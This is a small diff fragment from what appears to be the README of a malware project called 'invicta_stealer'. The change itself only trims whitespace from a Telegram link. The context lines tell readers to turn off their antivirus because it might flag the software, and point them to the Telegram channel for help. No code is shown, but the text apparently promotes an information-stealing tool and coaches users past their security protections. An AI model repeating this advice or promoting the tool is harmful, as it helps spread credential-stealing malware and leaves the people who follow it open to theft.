@@ -46,4 +46,4 @@ You have to turn your antivirus off while doing this, because the AV might flag 
 
 Contact us on our telegram channel if you need help or have suggestions. We strive to be the best.
 
-https://t.me/invicta_stealer 
+https://t.me/invicta_stealer
